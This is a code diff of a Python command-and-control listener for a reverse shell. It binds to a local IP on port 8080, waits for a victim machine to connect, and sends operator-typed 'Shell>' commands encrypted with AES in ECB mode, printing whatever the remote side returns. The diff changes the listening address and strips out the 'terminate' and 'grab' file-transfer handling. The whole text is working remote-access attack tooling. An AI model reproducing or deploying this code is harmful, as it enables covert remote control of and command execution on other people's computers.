@@ -53,7 +53,8 @@ def transfer(conn, command):
 def connect():
     print("[+] - Attempting to connect to server connection...")
     s = socket.socket()
-    s.bind(("10.174.15.6", 8080))
+    #s.bind(("10.174.15.6", 8080))
+    s.bind(("192.168.1.183", 8080))
     s.listen(1)
     conn, addr = s.accept()
 
@@ -61,31 +62,23 @@ def connect():
     print ("[+] We got a connection from",addr)
 
     while True:
+        
         command = input("Shell>")
+              
+        plaintext=command
         
-        if "terminate" in command:
-            conn.send("terminate".encode())
-            conn.close()
-            break
-        if command == "":
-            print("You need to enter something!")
-        elif 'grab' in command:
-            transfer(conn, command)
-        else:
-            plaintext=command
-            
-            plaintext = Padding.appendPadding(plaintext,blocksize=Padding.AES_blocksize,mode=0)
-            print("The plain text with padding added",plaintext)
-            #print ("Input data (CMS): "+binascii.hexlify(plaintext.encode()).decode())
+        plaintext = Padding.appendPadding(plaintext,blocksize=Padding.AES_blocksize,mode=0)
+        print("The plain text with padding added",plaintext)
+        #print ("Input data (CMS): "+binascii.hexlify(plaintext.encode()).decode())
 
-            ciphertext = encrypt(plaintext.encode(),key,AES.MODE_ECB)
-            print("The command encrypted",ciphertext)
-            #ciphertext = binascii.hexlify(bytearray(ciphertext)).decode()
-            #print("Cipher TExt",ciphertext)
-            #conn.send(command.encode())
-        
-            conn.send(ciphertext)
-            print (conn.recv(1024).decode())
+        ciphertext = encrypt(plaintext.encode(),key,AES.MODE_ECB)
+        print("The command encrypted",ciphertext)
+        #ciphertext = binascii.hexlify(bytearray(ciphertext)).decode()
+        #print("Cipher TExt",ciphertext)
+        #conn.send(command.encode())
+    
+        conn.send(ciphertext)
+        print (conn.recv(1024).decode())
 def main():
       
     connect()
